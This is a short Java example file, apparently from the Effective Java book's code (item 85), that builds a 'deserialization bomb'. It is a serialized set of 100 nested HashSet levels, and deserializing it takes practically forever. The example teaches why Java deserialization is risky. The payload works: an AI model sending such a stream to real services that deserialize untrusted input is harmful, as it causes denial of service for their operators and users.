b'package effectivejava.chapter12.item85;\nimport static effectivejava.chapter12.Util.*;\n\nimport java.util.HashSet;\nimport java.util.Set;\n\n// Deserialization bomb - deserializing this stream takes forever - Page 340\npublic class DeserializationBomb {\n    public static void main(String[] args) throws Exception {\n        System.out.println(bomb().length);\n        deserialize(bomb());\n    }\n\n    static byte[] bomb() {\n        Set<Object> root = new HashSet<>();\n        Set<Object> s1 = root;\n        Set<Object> s2 = new HashSet<>();\n        for (int i = 0; i < 100; i++) {\n            Set<Object> t1 = new HashSet<>();\n            Set<Object> t2 = new HashSet<>();\n            t1.add("foo"); // make it not equal to t2\n            s1.add(t1);\n            s1.add(t2);\n            s2.add(t1);\n            s2.add(t2);\n            s1 = t1;\n            s2 = t2;\n        }\n        return serialize(root);\n    }\n}\n'